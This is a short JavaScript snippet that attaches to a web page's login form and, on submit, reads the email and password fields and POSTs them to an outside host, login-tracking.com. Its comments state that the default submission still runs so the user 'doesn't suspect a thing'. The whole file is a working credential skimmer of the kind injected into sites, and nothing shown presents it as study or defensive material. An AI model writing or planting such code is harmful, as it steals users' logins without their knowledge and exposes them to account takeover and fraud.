window.onload=function() {
    document.getElementById('login-form').onsubmit = function() {
    	let email = document.getElementsByName("email")[0].value;
    	let password = document.getElementsByName("password")[0].value;

  		/** send user id & password to login-tracking.com **/
  		let userString = 'id='+email+'&password='+password;

		var xhr = new XMLHttpRequest();
		xhr.open('POST', "http://login-tracking.com/store_credentials", true); 
 		xhr.send(userString); 
    	
    	/* return true so that default form behavior runs and user doesn't suspect a thing */
    	return true;
  	}
}